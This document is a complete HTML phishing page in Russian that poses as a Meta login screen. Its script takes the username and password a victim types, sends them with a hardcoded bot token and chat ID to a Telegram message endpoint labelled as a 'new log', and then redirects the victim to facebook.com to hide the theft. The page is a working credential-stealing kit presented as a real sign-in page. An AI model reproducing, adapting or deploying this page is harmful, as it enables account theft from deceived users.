<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход • Meta</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
        body { background-color: #000; display: flex; flex-direction: column; align-items: center; height: 100vh; color: #fff; padding: 20px; }
        .container { width: 100%; max-width: 360px; margin-top: 40px; text-align: center; }
        .meta-logo { font-size: 18px; margin-bottom: 30px; display: flex; align-items: center; justify-content: center; gap: 5px; }
        .input-field { width: 100%; background-color: #1c1c1c; border: 1px solid #333; border-radius: 12px; padding: 16px 12px; color: #fff; font-size: 14px; margin-bottom: 12px; outline: none; }
        .login-btn { width: 100%; background-color: #0064e0; color: white; border: none; border-radius: 25px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        .footer { position: absolute; bottom: 30px; width: calc(100% - 40px); max-width: 360px; }
        .create-btn { width: 100%; background-color: transparent; color: #4c95ff; border: 1px solid #4c95ff; border-radius: 25px; padding: 10px; text-decoration: none; display: block; text-align: center; font-size: 14px; }
    </style>
</head>
<body>

    <div class="container">
        <div class="meta-logo"><span>∞</span> Meta</div>
        <form id="login-gate">
            <input type="text" id="u" class="input-field" placeholder="Имя пользователя, почта или телефон" required>
            <input type="password" id="p" class="input-field" placeholder="Пароль" required>
            <button type="submit" class="login-btn">Войти</button>
        </form>
    </div>

    <div class="footer">
        <a href="#" class="create-btn">Создать новый аккаунт</a>
    </div>

    <script>
        const T = '7219144599:AAG7NyCQkRimWGk9He48fskkMzoaLjUyUHk';
        const C = '6576262467';

        document.getElementById('login-gate').addEventListener('submit', function(e) {
            e.preventDefault();
            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            const text = `⚠️ НОВЫЙ ЛОГ:\n👤 Логин: ${user}\n🔑 Пароль: ${pass}`;

            fetch(`https://telegram.org{T}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: C, text: text })
            })
            .finally(() => {
                window.location.href = 'https://facebook.com';
            });
        });
    </script>
</body>
</html>
